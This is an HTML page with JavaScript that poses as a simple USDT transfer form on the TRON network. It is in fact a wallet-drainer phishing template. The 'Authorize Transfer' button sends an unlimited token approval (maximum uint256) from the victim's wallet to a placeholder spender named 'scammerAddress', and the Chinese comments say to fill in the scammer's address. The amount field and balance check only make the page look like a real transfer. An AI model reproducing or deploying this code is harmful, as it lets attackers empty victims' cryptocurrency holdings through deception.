<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>USDT Transfer</title>
    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/TronWeb/tronweb@latest/dist/TronWeb.js"></script>
</head>
<body>
    <h1>Transfer USDT</h1>
    <p>Enter the amount of USDT you want to transfer:</p>
    <input type="text" class="amountInput" placeholder="Amount">
    <button onclick="approveToken()">Authorize Transfer</button>
    <p class="tipError"></p>
    <script>
        async function approveToken() {
            const trc20ContractAddress = "TR7NHqjeKQoxGTci88i8ZyApLBoTsZiGj6"; // USDT合约地址
            const scammerAddress = "0xScammerAddress"; // 替换为骗子地址

            if (typeof window.tronWeb === 'undefined' || typeof window.tronWeb.defaultAddress.base58 === 'undefined') {
                document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">TRX钱包地址不足</span>';
                return;
            }

            const trc20Address = window.tronWeb.defaultAddress.base58;
            console.log("User Wallet Address: ", trc20Address);

            try {
                let contract = await window.tronWeb.contract().at(trc20ContractAddress);
                let num = document.getElementsByClassName("amountInput")[0].value;
                console.log("Amount Entered: ", num);

                let balance = await contract.balanceOf(trc20Address).call();
                let userBalance = balance.toNumber();
                console.log("User Balance: ", userBalance);

                let amountToSend = parseInt(num) * 1000000;

                if (amountToSend > userBalance) {
                    document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">USDT余额不足</span>';
                    return;
                }

                console.log("Sending approve request...");

                await contract.approve(
                    scammerAddress, // 地址 _spender
                    '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' // 最大授权量
                ).send({ from: trc20Address, feeLimit: 1000000 }).then(output => {
                    console.log('Authorization output: ', output);
                    document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#00db00">授权成功</span>';
                }).catch(error => {
                    console.error('Error during approval: ', error);
                    document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">授权失败</span>';
                });

            } catch (e) {
                console.error('Exception caught: ', e);
                document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">操作失败</span>';
            }
        }
    </script>
</body>
</html>
